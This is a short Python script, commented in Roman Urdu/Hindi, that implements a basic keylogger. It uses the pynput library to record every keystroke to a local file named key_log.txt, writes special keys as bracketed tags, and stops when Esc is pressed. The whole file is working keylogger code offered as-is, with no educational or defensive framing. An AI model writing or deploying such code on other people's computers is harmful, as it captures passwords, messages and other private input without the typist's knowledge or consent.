from pynput.keyboard import Key, Listener

# Jis file mein keys save hongi us ka naam
log_file = "key_log.txt"

def on_press(key):
    try:
        # Regular characters (alphabets, numbers) ko text file mein write karne ke liye
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        # Special keys (Space, Enter, Shift, etc.) ko handle karne ke liye
        with open(log_file, "a") as f:
            if key == Key.space:
                f.write(" ") # Space bar ke liye actual space enter karein
            elif key == Key.enter:
                f.write("\n") # Enter ke liye nayi line
            elif key == Key.tab:
                f.write("\t") # Tab ke liye space
            else:
                f.write(f" [{str(key)}] ") # Baaki special keys ko brackets mein dikhane ke liye

def on_release(key):
    # Agar program ko stop karna ho, toh 'Esc' key dabaein
    if key == Key.esc:
        print("\n[+] Stopping Keylogger...")
        return False

# Listener ko start karne aur active rakhne ke liye
print("[+] Keylogger is running... Press 'Esc' to stop.")
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
